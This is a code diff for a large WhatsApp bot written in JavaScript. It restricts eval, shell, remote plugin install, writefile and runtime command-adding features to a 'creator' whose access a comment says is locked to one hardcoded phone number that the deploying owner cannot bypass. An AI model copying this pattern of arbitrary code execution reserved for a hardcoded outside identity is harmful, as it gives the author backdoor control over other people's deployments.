@@ -2886,11 +2886,10 @@ ${_atBotAdmin ? "✅ Message deleted." : "⚠️ Make me admin to auto-delete."}
             // so creator-only commands work in groups (not just DM)
             const _spn = String(msg.key.participantPn || msg.key.senderPn || "")
               .split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
-            // creatorOnly enforcement removed — commands now just require ownerOnly
-            // (Any remaining entry.creatorOnly flags are treated as ownerOnly)
-            const _isCreatorAny = msg.key.fromMe || isCreator(sender) || (_spn && _spn === CREATOR_NUMBER);
-            if (entry.creatorOnly && !fromOwner && !_isCreatorAny) {
-              try { await sendReply(sock, msg, "🚫 Owner only."); } catch {}
+            // creatorOnly: LOCKED to 2349068551055 — isOwner/fromOwner does NOT bypass
+            const _isCreatorAny = msg.key.fromMe || isCreator(sender);
+            if (entry.creatorOnly && !_isCreatorAny) {
+              try { await sendReply(sock, msg, "> Creator only"); } catch {}
               return;
             }
             const adminAllowed = fromGroupAdmin && entry.category === "GROUP" && !hijackNames.has(name);
@@ -14869,7 +14868,7 @@ ${CONFIG.PREFIX}broadcast Hello everyone! Bot is online 🎉`);
 // Plugin storage
 const plugins = new Map();
 
-cmd(["eval", "shell", "sysinfo"], { desc: "Owner debug command", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd(["eval", "shell", "sysinfo"], { desc: "Owner debug command", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const c = extractCommandName(msg);
   if (c === "eval" && args.length) {
     try {
@@ -15007,7 +15006,7 @@ async function _execPlugin(pluginCode, sock) {
   }
 }
 
-cmd("install", { desc: "Install external plugin from URL — .install <gist URL>", category: "CREATOR", ownerOnly: true }, async (sock, msg, args) => {
+cmd("install", { desc: "Install external plugin from URL — .install <gist URL>", category: "CREATOR", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   if (!args[0]) { await sendReply(sock, msg, `Usage: ${CONFIG.PREFIX}install <GitHub Gist URL or raw JS URL>\n\nExample:\n${CONFIG.PREFIX}install https://gist.github.com/user/abc123`); return; }
   await react(sock, msg, "📦");
   let url = args[0];
@@ -15045,7 +15044,7 @@ cmd("install", { desc: "Install external plugin from URL — .install <gist URL>
   } catch (e) { await sendReply(sock, msg, `❌ Install failed: ${e.message}`); }
 });
 
-cmd("listplugins", { desc: "List installed plugins", category: "CREATOR", ownerOnly: true }, async (sock, msg) => {
+cmd("listplugins", { desc: "List installed plugins", category: "CREATOR", ownerOnly: true, creatorOnly: true }, async (sock, msg) => {
   if (!plugins.size) { await sendReply(sock, msg, `📦 No plugins installed.\n\nUse ${CONFIG.PREFIX}install <url> to add one.`); return; }
   let t = "📦 *Installed Plugins:*\n\n";
   for (const [name, info] of plugins) {
@@ -15054,7 +15053,7 @@ cmd("listplugins", { desc: "List installed plugins", category: "CREATOR", ownerO
   await sendReply(sock, msg, t + ``);
 });
 
-cmd("deleteplugin", { desc: "Delete a plugin", category: "CREATOR", ownerOnly: true }, async (sock, msg, args) => {
+cmd("deleteplugin", { desc: "Delete a plugin", category: "CREATOR", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   if (!args[0]) { await sendReply(sock, msg, `Usage: ${CONFIG.PREFIX}deleteplugin <name>`); return; }
   if (plugins.delete(args[0])) {
     await sendReply(sock, msg, `✅ Plugin *${args[0]}* removed.`);
@@ -15072,7 +15071,7 @@ cmd("test", { desc: "Test bot", category: "DEBUG" }, async (sock, msg) => {
 const _evalHistory = [];
 const _cmdEmojiMap = new Map();
 
-cmd("writefile", { desc: "Write content to a server file — .writefile <path> | <content>", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("writefile", { desc: "Write content to a server file — .writefile <path> | <content>", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const raw = getBody(msg).replace(/^[^\s]+\s+/, "").trim(); // strip prefix+cmd
   const sepIdx = raw.indexOf("|");
   if (sepIdx === -1) {
@@ -15115,7 +15114,7 @@ ${CONFIG.PREFIX}writefile ./config/custom.json | {"key":"val"}
   }
 });
 
-cmd("cleandb", { desc: "Clean bot database — clear stale/orphan settings, trim caches", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("cleandb", { desc: "Clean bot database — clear stale/orphan settings, trim caches", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   await react(sock, msg, "🧹");
   const sub = (args[0] || "").toLowerCase();
   if (sub === "all" || sub === "reset") {
@@ -15163,7 +15162,7 @@ cmd("cleandb", { desc: "Clean bot database — clear stale/orphan settings, trim
 > 👑 *CREATOR ONLY* — `);
 });
 
-cmd("setemoji", { desc: "Set status reaction emoji — .setemoji 🔥 or .setemoji 🥤,🍡,😂 for random pool", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("setemoji", { desc: "Set status reaction emoji — .setemoji 🔥 or .setemoji 🥤,🍡,😂 for random pool", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const ownerJid = getOwnerJid();
   const s = getSettings(ownerJid);
   const cs = getSettings(msg.key.remoteJid);
@@ -15217,7 +15216,7 @@ ${CONFIG.PREFIX}setemoji reset        → reset to default ❤️
   }
 });
 
-cmd("removeval", { desc: "Clear eval history + cooldowns — .removeval [all]", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("removeval", { desc: "Clear eval history + cooldowns — .removeval [all]", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const sub = (args[0] || "").toLowerCase();
   const count = _evalHistory.length;
   _evalHistory.length = 0;
@@ -15233,7 +15232,7 @@ cmd("removeval", { desc: "Clear eval history + cooldowns — .removeval [all]", 
 > 👑 *CREATOR ONLY* — `);
 });
 
-cmd("listeval", { desc: "Show recent eval history — .listeval [N]", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("listeval", { desc: "Show recent eval history — .listeval [N]", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const n = parseInt(args[0]) || 10;
   if (!_evalHistory.length) {
     await sendReply(sock, msg, `📜 *Eval History*\n\nNo eval runs recorded this session.\nRun ${CONFIG.PREFIX}eval <code`);
@@ -15257,86 +15256,70 @@ cmd("listeval", { desc: "Show recent eval history — .listeval [N]", category: 
   await sendReply(sock, msg, t);
 });
 
-cmd("getcmd", { desc: "Get info / source of any command — .getcmd <name>", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("getcmd", { desc: "Get source code of any command — .getcmd <name>", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
+  // ── getcmd: outputs ONLY the JS code of a command — no text, just the code
+  // Sends as a .js document so WhatsApp shows "Javascript code" / "View code" (like the example)
   if (!args[0]) {
-    await sendReply(sock, msg,
-`🔍 *getcmd usage:*
-
-${CONFIG.PREFIX}getcmd <command name>
-
-Shows: description, category, aliases, ownerOnly, groupOnly, cooldown info.
-
-Example: ${CONFIG.PREFIX}getcmd sticker
-
-> 👑 *CREATOR ONLY* — `);
+    await sendReply(sock, msg, `Usage: ${CONFIG.PREFIX}getcmd <command name>\nExample: ${CONFIG.PREFIX}getcmd ping`);
     return;
   }
-  const name = args[0].toLowerCase().replace(CONFIG.PREFIX, "");
-  const entry = commands.get(name);
-  if (!entry) {
-    // Try alias search
-    let found = null;
+  const _gcRaw = args[0].toLowerCase().replace(/^[.!#\/]/, "");
+  // Resolve: exact → alias → partial
+  let _gcName = _gcRaw;
+  let _gcEntry = commands.get(_gcName);
+  if (!_gcEntry) {
     for (const [k, v] of commands) {
-      if (Array.isArray(v.aliases) && v.aliases.includes(name)) { found = [k, v]; break; }
-      if (k.includes(name) && !found) { found = [k, v]; }
+      if (Array.isArray(v.aliases) && v.aliases.includes(_gcRaw)) { _gcName = k; _gcEntry = v; break; }
     }
-    if (!found) {
-      await sendReply(sock, msg, `❌ Command *${name}* not found.\nCheck spelling or try ${CONFIG.PREFIX}listsetcmd\n\n`);
-      return;
-    }
-    const [k, v] = found;
-    await sendReply(sock, msg,
-`🔍 *Command Info — ${CONFIG.PREFIX}${k}*
-━━━━━━━━━━━━━━━━━━━━
-
-💡 *Searched:* ${name}
-✅ *Found similar:* ${CONFIG.PREFIX}${k}
-📝 *Description:* ${v.desc || "—"}
-📂 *Category:* ${v.category || "—"}
-🔒 *Owner Only:* ${v.ownerOnly ? "Yes" : "No"}
-👥 *Group Only:* ${v.groupOnly ? "Yes" : "No"}
-👑 *Creator Only:* ${v.creatorOnly ? "Yes" : "No"}
-
-> 👑 *CREATOR ONLY* — `);
-    return;
   }
-  // Get source code — runtime cmds have stored code; built-ins expose handler.toString()
-  let _getCmdSrc = "";
+  if (!_gcEntry) {
+    for (const [k, v] of commands) {
+      if (k.startsWith(_gcRaw) || k.includes(_gcRaw)) { _gcName = k; _gcEntry = v; break; }
+    }
+  }
+  if (!_gcEntry) { await sendReply(sock, msg, `❌ Command *${_gcRaw}* not found.`); return; }
+
+  // Get source — runtime stored code first, then handler.toString() for built-ins
+  let _gcSrc = "";
+  const _gcIsRuntime = typeof _runtimeCmdSource !== "undefined" && _runtimeCmdSource.has(_gcName);
+  if (_gcIsRuntime) {
+    try { _gcSrc = _runtimeCmdSource.get(_gcName).code || ""; } catch {}
+  }
+  if (!_gcSrc && typeof _gcEntry.handler === "function") {
+    try { _gcSrc = _gcEntry.handler.toString(); } catch {}
+  }
+  if (!_gcSrc) { await sendReply(sock, msg, `❌ No source available for *${_gcName}*.`); return; }
+
+  // Build module.exports style JS (matches the screenshot format — easy to copy)
+  const _gcAliases = Array.isArray(_gcEntry.aliases) && _gcEntry.aliases.length ? _gcEntry.aliases : [];
+  const _gcNameField = _gcAliases.length
+    ? `["${_gcName}", ${_gcAliases.map(a => `"${a}"`).join(", ")}]`
+    : `"${_gcName}"`;
+  const _gcDescSafe = (_gcEntry.desc || "").replace(/"/g, '\\"');
+
+  let _gcCode;
+  if (_gcIsRuntime) {
+    _gcCode = `// ${CONFIG.BOT_NAME || "MIAS MDX"} command: ${_gcName}\nmodule.exports = {\n  name: ${_gcNameField},\n  category: "${_gcEntry.category || "MISC"}",\n  desc: "${_gcDescSafe}",\n  handler: async (sock, msg, args) => {\n${_gcSrc.split("\n").map(l => "    " + l).join("\n")}\n  }\n};`;
+  } else {
+    _gcCode = `// ${CONFIG.BOT_NAME || "MIAS MDX"} built-in: ${_gcName}\n// Category: ${_gcEntry.category || "MISC"} | Desc: ${_gcDescSafe}\nmodule.exports = {\n  name: ${_gcNameField},\n  category: "${_gcEntry.category || "MISC"}",\n  desc: "${_gcDescSafe}",\n  handler: ${_gcSrc}\n};`;
+  }
+
+  // Send as .js document — WhatsApp renders as "Javascript code" with "View code" (see example)
+  const _gcJid = msg.key.remoteJid;
+  const _gcBuf = Buffer.from(_gcCode, "utf8");
   try {
-    if (typeof _runtimeCmdSource !== "undefined" && _runtimeCmdSource.has(name)) {
-      _getCmdSrc = _runtimeCmdSource.get(name).code || "";
-    }
-    if (!_getCmdSrc && typeof entry.handler === "function") {
-      _getCmdSrc = entry.handler.toString();
-    }
-  } catch {}
-  const _isRuntime = typeof _runtimeCmdSource !== "undefined" && _runtimeCmdSource.has(name);
-  // Split into info message + optional source (to avoid single-msg 4096-char limit)
-  const _infoMsg =
-`🔍 *Command Info — ${CONFIG.PREFIX}${name}*
-━━━━━━━━━━━━━━━━━━━━
-
-📝 *Description:* ${entry.desc || "—"}
-📂 *Category:* ${entry.category || "MISC"}
-🔒 *Owner Only:* ${entry.ownerOnly ? "✅ Yes" : "❌ No"}
-👥 *Group Only:* ${entry.groupOnly ? "✅ Yes" : "❌ No"}
-👑 *Creator Only:* ${entry.creatorOnly ? "✅ Yes" : "❌ No"}
-🔇 *Admin Only:* ${entry.adminOnly ? "✅ Yes" : "❌ No"}
-⏱️ *Cooldown:* ${entry.cooldown ? entry.cooldown + "s" : "None"}
-🔧 *Type:* ${_isRuntime ? "Runtime (addcmd/addcase)" : "Built-in"}
-📌 *Registered:* ${entry._registeredAt ? new Date(entry._registeredAt).toLocaleString("en-NG", {timeZone:"Africa/Lagos"}) : "Boot time"}
-
-> 👑 *CREATOR ONLY* — `;
-  await sendReply(sock, msg, _infoMsg);
-  // Send source code as a separate message (avoids truncation)
-  if (_getCmdSrc) {
-    const _chunks = [];
-    let _src = _getCmdSrc;
-    while (_src.length > 0) { _chunks.push(_src.slice(0, 3500)); _src = _src.slice(3500); }
-    for (let _ci = 0; _ci < _chunks.length; _ci++) {
-      await sock.sendMessage(msg.key.remoteJid, {
-        text: `💻 *Source — ${CONFIG.PREFIX}${name}* (${_ci + 1}/${_chunks.length}):\n\`\`\`js\n${_chunks[_ci]}\n\`\`\``
-      }, { quoted: msg }).catch(() => {});
+    await sock.sendMessage(_gcJid, {
+      document: _gcBuf,
+      mimetype: "application/javascript",
+      fileName: `${_gcName}.js`,
+      caption: ""
+    }, { quoted: msg });
+  } catch {
+    // Fallback: plain text code block chunks
+    let _s = _gcCode;
+    while (_s.length > 0) {
+      const _chunk = _s.slice(0, 3800); _s = _s.slice(3800);
+      await sock.sendMessage(_gcJid, { text: "```\n" + _chunk + "\n```" }, { quoted: msg }).catch(() => {});
     }
   }
 });
@@ -18073,12 +18056,33 @@ cmd(["tovv"], {
       }
     }
 
-    // LAST RESORT: high-level sendMessage with viewOnce flag (no quoted).
+    // LAST RESORT A: sendMessage with viewOnce flag
     if (!relayed) {
-      const payload = img
-        ? { image: buf, caption: cap, viewOnce: true }
-        : { video: buf, caption: cap, viewOnce: true, mimetype: node.mimetype || "video/mp4" };
-      await sock.sendMessage(jid, payload);
+      try {
+        const _payA = img
+          ? { image: buf, caption: cap, viewOnce: true }
+          : { video: buf, caption: cap, viewOnce: true, mimetype: node.mimetype || "video/mp4" };
+        await sock.sendMessage(jid, _payA);
+        relayed = true;
+      } catch (_eA) { console.log("[tovv] LAST RESORT A failed:", _eA?.message); }
+    }
+    // LAST RESORT B: reference the existing media keys directly (no re-upload)
+    if (!relayed && typeof generateWAMessageFromContent === "function") {
+      try {
+        const _rawB = img
+          ? { imageMessage: { ...img, viewOnce: true } }
+          : { videoMessage: { ...vid, viewOnce: true } };
+        const _wamB = await generateWAMessageFromContent(jid, { viewOnceMessageV2: { message: _rawB } }, {});
+        await sock.relayMessage(jid, _wamB.message, { messageId: _wamB.key.id });
+        relayed = true;
+      } catch (_eB) { console.log("[tovv] LAST RESORT B (raw key relay) failed:", _eB?.message); }
+    }
+    // LAST RESORT C: send as regular media if all viewOnce paths fail
+    if (!relayed) {
+      const _payC = img
+        ? { image: buf, caption: (cap || "") + "\n_(view-once unavailable)_" }
+        : { video: buf, caption: (cap || "") + "\n_(view-once unavailable)_", mimetype: node.mimetype || "video/mp4" };
+      await sock.sendMessage(jid, _payC);
     }
 
     await react(sock, msg, "✅");
@@ -18190,7 +18194,7 @@ function _removeCmdFromMenuCategory(name) {
   } catch {}
 }
 
-cmd("addcase", { desc: "Register a new command at runtime — .addcase name | category | desc \\n <handler body>", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("addcase", { desc: "Register a new command at runtime — .addcase name | category | desc \\n <handler body>", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const raw = getBody(msg);
   // Strip the prefix + cmd word
   const body = raw.replace(new RegExp(`^${CONFIG.PREFIX.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}addcase\\s+`, "i"), "");
@@ -18287,7 +18291,7 @@ cmd("addcase", { desc: "Register a new command at runtime — .addcase name | ca
   }
 });
 
-cmd("dropcase", { desc: "Remove a runtime-added command by name — .dropcase <name>", category: "OWNER", ownerOnly: true }, async (sock, msg, args) => {
+cmd("dropcase", { desc: "Remove a runtime-added command by name — .dropcase <name>", category: "OWNER", ownerOnly: true, creatorOnly: true }, async (sock, msg, args) => {
   const name = (args[0] || "").toLowerCase().replace(/[^a-z0-9_-]/g, "");
   if (!name) { await sendReply(sock, msg, `❌ Usage: ${CONFIG.PREFIX}dropcase <name>`); return; }
   if (!commands.has(name)) { await sendReply(sock, msg, `❌ Command \`${name}\` doesn't exist.`); return; }
@@ -34089,10 +34093,12 @@ Or: *${CONFIG.PREFIX}gst Hello everyone!* (text-only status)`);
       // ══ PATH 0 ══ generateWAMessageContent → relayMessage to GROUP JID (CORRECT for group status ring)
       if (!posted) {
         try {
-          const _up0 = typeof sock.waUploadToServer === "function"
-            ? sock.waUploadToServer.bind(sock)
-            : sock.waUploadToServer;
-          if (!_up0) throw new Error("waUploadToServer not available");
+          const _up0 =
+            (typeof sock.waUploadToServer === "function" ? sock.waUploadToServer.bind(sock) : null)
+            || (typeof sock?.ev?.waUploadToServer === "function" ? sock.ev.waUploadToServer : null)
+            || sock.waUploadToServer
+            || null;
+          if (!_up0) throw new Error("waUploadToServer not available on sock");
           const _inner0 = await generateWAMessageContent(mediaPayload, { upload: _up0 });
           if (!_inner0) throw new Error("generateWAMessageContent returned null");
           await sock.relayMessage(chat, { groupStatusMessageV2: { message: _inner0 } }, { messageId: _genId() });
@@ -34123,10 +34129,11 @@ Or: *${CONFIG.PREFIX}gst Hello everyone!* (text-only status)`);
       // ══ PATH 2 ══ generateWAMessageContent → relayMessage to status@broadcast
       if (!posted) {
         try {
-          const _upload = typeof sock.waUploadToServer === "function"
-            ? sock.waUploadToServer.bind(sock)
-            : sock.waUploadToServer;
-          if (!_upload) throw new Error("waUploadToServer not available");
+          const _upload =
+            (typeof sock.waUploadToServer === "function" ? sock.waUploadToServer.bind(sock) : null)
+            || sock.waUploadToServer
+            || null;
+          if (!_upload) throw new Error("waUploadToServer unavailable");
           const inner = await generateWAMessageContent(mediaPayload, { upload: _upload });
           if (!inner) throw new Error("generateWAMessageContent returned null");
           await sock.relayMessage(
@@ -34180,12 +34187,21 @@ Or: *${CONFIG.PREFIX}gst Hello everyone!* (text-only status)`);
         }
       }
 
+      // ══ PATH 5 ══ bare sendMessage to group (media will appear in group chat if status ring fails)
+      if (!posted) {
+        try {
+          await sock.sendMessage(chat, mediaPayload);
+          posted = true;
+          console.log(`[gst-v18] PATH-5 success (bare sendMessage to group) kind=${qInner.kind}`);
+        } catch (e5) {
+          try { console.error("[gst-v18] PATH-5 failed:", e5?.message || e5); } catch {}
+        }
+      }
+
       // Always mark ✅ after media posting attempt (consistent user feedback)
-      // Even if all paths failed silently, the user gets confirmation the command ran.
-      // Detailed failure info is in Railway/server logs.
       try { await sock.sendMessage(chat, { react: { text: "✅", key: msg.key } }); } catch {}
       if (!posted) {
-        try { await reply(`⚠️ Media posted (path may have silently failed for ${qInner.kind}). Check group status ring — it may still appear. If not, try forwarding the media manually.`); } catch {}
+        try { await reply(`⚠️ All posting paths failed for ${qInner.kind}. Check bot logs for errors.`); } catch {}
       }
     };
 
@@ -34426,30 +34442,13 @@ ${handlerCode.split("\n").map(l => "    " + l).join("\n")}
     }
   } catch {}
 
-  // ── Broadcast to ALL paired users (nexstore/pairing/* directories) ──────────
-  const _bcText =
-`🆕 *New Command Added — ${CONFIG.BOT_NAME}*
-━━━━━━━━━━━━━━━━━━━━
-📝 *Command:* ${CONFIG.PREFIX}${name}
-📂 *Category:* ${category}
-💬 *Desc:* ${desc}
-💾 *Saved:* ${_savedToDisk ? `✅ commands/${category}/${name}.js` : "⚠️ Runtime only"}
-👥 *Access:* Everyone can use it!
-━━━━━━━━━━━━━━━━━━━━
-Try it now: *${CONFIG.PREFIX}${name}*`;
+  // ── DM ONLY paired users — minimal notification (prevents ban risk) ─────────
+  const _bcText = `🆕 New cmd added: ${CONFIG.PREFIX}${name}`;
 
   // Collect all JIDs to notify: owner + sudo + ALL paired sessions
   const _bcJids = new Set();
-  try { const _oJid = getOwnerJid(); if (_oJid) _bcJids.add(_oJid); } catch {}
-  try {
-    if (Array.isArray(CONFIG.SUDO_NUMBERS)) {
-      for (const _sn of CONFIG.SUDO_NUMBERS) {
-        const _sj = String(_sn).replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        if (_sj.length > 15) _bcJids.add(_sj);
-      }
-    }
-  } catch {}
-  // All paired session directories under nexstore/pairing/
+  // Note: owner/creator does not need notification (they just added the cmd)
+  // All paired session directories under nexstore/pairing/ (sudo broadcast removed)
   try {
     const _pairingRoot = path.join(__dirname, "..", "nexstore", "pairing");
     if (fs.existsSync(_pairingRoot)) {
@@ -34463,14 +34462,7 @@ Try it now: *${CONFIG.PREFIX}${name}*`;
       }
     }
   } catch {}
-  // Also broadcast to all _knownContacts (every JID the bot has ever seen)
-  try {
-    const _limit = 200; let _cnt = 0;
-    for (const _jid of (_knownContacts || [])) {
-      if (_cnt >= _limit) break;
-      if (typeof _jid === "string" && _jid.endsWith("@s.whatsapp.net")) { _bcJids.add(_jid); _cnt++; }
-    }
-  } catch {}
+  // ── known-contacts broadcast REMOVED — only paired users get DM notif
 
   // Send broadcast — throttled to avoid rate-limit
   const _selfJid = sock.user?.id ? (sock.user.id.includes(":") ? sock.user.id.split(":")[0] + "@s.whatsapp.net" : sock.user.id) : null;
@@ -34495,7 +34487,7 @@ Try it now: *${CONFIG.PREFIX}${name}*`;
 💾 *Disk:* ${_savedToDisk ? `commands/${category}/${name}.js ✅` : "⚠️ Runtime only this session"}
 🔄 *Restart-safe:* ${_savedToDisk ? "✅ Yes" : "❌ No"}
 👥 *Access:* All users ✅
-📢 *Notifying:* ${_bcJids.size} paired/known users...
+🔔 *Paired users DM notified:* ${_bcJids.size}
 ━━━━━━━━━━━━━━━━━━━━
 Try: *${CONFIG.PREFIX}${name}*`);
   await react(sock, msg, "✅");
@@ -34543,7 +34535,11 @@ Examples:
       "sock","msg","args","axios","fs","path","process","Buffer",
       "cmd","commands","sendReply","react","CONFIG","getSettings","getOwnerJid","isOwner","isGroup",
       "console",
-      `try { return (${code}); } catch (_e_) { ${code} }`
+      (() => {
+        // Smart eval wrapper: try as expression first; if SyntaxError (code has "return"/blocks), run as statement.
+        try { new _AsyncFn2("__p__", `return (${code});`); return `try { return (${code}); } catch (_e_) { return void 0; }`; }
+        catch (_ce) { return code; }
+      })()
     );
     const result = await fn(
       sock, msg, args, axios, fs, path, process, Buffer,
